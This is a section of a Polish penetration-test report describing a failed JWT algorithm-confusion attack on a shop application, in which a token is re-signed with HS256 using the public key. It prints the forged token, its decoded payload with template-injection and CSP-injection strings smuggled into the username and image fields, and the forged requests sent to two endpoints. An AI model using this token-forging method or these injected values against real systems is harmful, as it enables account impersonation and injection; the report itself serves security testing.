\subsection{\colorbox{green!80}{\parbox{\textwidth}{PT19-JWT-HS: Użycie żetona JWT z innym algorytmem podpisu}}}
\subsubsection{Opis}
Atak polegał na zaszyfrowaniu zmodyfikowanego żetonu z użyciem klucza publicznego sklepu, ale algorytmem symetrycznym HS256.

W przypadku końcówki rest/user/whoami mimo pozytywnego statusu odpowiedzi aplikacja nie zwraca żadnych informacji o użytkowniku, co oznacza że tak zmanipulowany token nie jest akceptowany. Jak się jednak okazało końcówka ta jest niesprawna.

Testy na końcówce /profile polegające na próbie zmiany pseudonimu potwierdziły jednak, że aplikacja została poprawiona.

\subsubsection{Warunki wykonania ataku}
Atakujący musi wiedzieć skąd pobrać klucz publiczny sklepu. Atakujący musi posiadać poprawny token do zmodyfikowania.

\subsubsection{Szczegóły ataku}
Przykładowy FAKE\_TOKEN był równy: 
\begin{lstlisting}
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiI3t2YXIgYSA9ICdh
YmNkZWZnaCc7dmFyIGIgPSAxMjM7IGErYn0iLCJlbWFpbCI6ImZpbGlwQG1haWwuY29tIiwicGFzc3dv
cmQiOiJiYTZjZGFhNTNkZWQ0NDI4NTk2MzAxNGM4M2RjY2FjZmU5ZTA2ZTliNDM4NzYzYmM0YmExYTIz
ODMzZWRkNDc3Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6
IjEwLjQyLjEyLjEwNCIsInByb2ZpbGVJbWFnZSI6Imh0dHA6Ly9hc3NldHMvcHVibGljL2ltYWdlcy91
cGxvYWRzLzIyLmpwZz9hPWI7IHNjcmlwdC1zcmMgJ3Vuc2FmZS1pbmxpbmUnIiwidG90cFNlY3JldCI6
IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA1LTEyIDA5OjA0OjUyLjE1OCArMDA6
MDAiLCJ1cGRhdGVkQXQiOiIyMDI1LTA1LTEyIDE2OjE0OjU4Ljc4OSArMDA6MDAiLCJkZWxldGVkQXQi
Om51bGx9LCJpYXQiOjE3NDcwNjczNjJ9.i09sGgLtT6JuiNtXyoGM_14fqGwOg9Ph80ZgbKKaCjQ
\end{lstlisting}

co można rozszyfrować do danych (część nieistotnych pól została pominięta):
\begin{lstlisting}
{
  "typ": "JWT",
  "alg": "HS256"
}
\end{lstlisting}
\begin{lstlisting}
{
  "status": "success",
  "data": {
    "id": 22,
    "username": "Carl",
    "email": "filip@mail.com",
    "password": "ba6cdaa53ded44285963014c83dccacfe9e06e9b438763bc4ba1a23833edd477",
    "role": "customer",
    [...]
  },
  [...]
}
\end{lstlisting}

Podpis stanowiący trzecią część tokena został dodatkowo zweryfikowany z użyciem serwisu jwt.io poprzez wklejenie sekretu aplikacji (/encryptionkeys/jwt.pub).

Żądanie realizujące atak:
\begin{table}[H]
\begin{tabular}{|l|l|l|l|l|l|}
\hline
\rowcolor[HTML]{EFEFEF} 
\multicolumn{1}{|c|}{\cellcolor[HTML]{EFEFEF}\textbf{Metoda}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Końcówka}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Nagłowki}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Ciasteczka}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Dane}}                             & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Odpowiedź/wynik}} \\ \hline
GET                                                          & /rest/user/whoami                                         & \begin{tabular}[c]{@{}l@{}}Authentication: \\ Bearer FAKE\_TOKEN\end{tabular}                                  & \begin{tabular}[c]{@{}l@{}}token: \\ FAKE\_TOKEN\end{tabular}                                           & - & 200 \{"user":\{\}\} \\ \hline
\end{tabular}
\end{table}

Jak się jednak okazało endpoint whoami zwracał pustą odpowiedź również dla poprawnego tokena, dlatego w celu sprawdzenia zabezpieczeń podjęta została próba zmiany pseudonimu z użyciem sztucznego JWT:
\begin{table}[H]
\begin{tabular}{|l|l|l|l|l|l|}
\hline
\rowcolor[HTML]{EFEFEF} 
\multicolumn{1}{|c|}{\cellcolor[HTML]{EFEFEF}\textbf{Metoda}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Końcówka}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Nagłowki}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Ciasteczka}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Dane}}                             & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Odpowiedź/wynik}} \\ \hline
POST                                                          & /profile                                         & \begin{tabular}[c]{@{}l@{}}Authentication: \\ Bearer FAKE\_TOKEN\end{tabular}                                  & -                                          & \{"username":"abc"\} & 500 Error: Blocked illegal activity by ::... \\ \hline
\end{tabular}
\end{table}

Jak widać próba wykonania tego ataku zakończyła się blokadą ze strony serwera (podobnie było przy teście tego endpointu z JWT bez podpisu). Dla porównania dla poprawnego JWT zapytanie kończyło się zmianą pseudonimu i przekierowaniem 302 na /profile. 

\subsubsection{Skutki}
Atak \textbf{nie powiódł się}. Zmodyfikowany token był blokowany przez wszystkie sprawdzone końcówki.
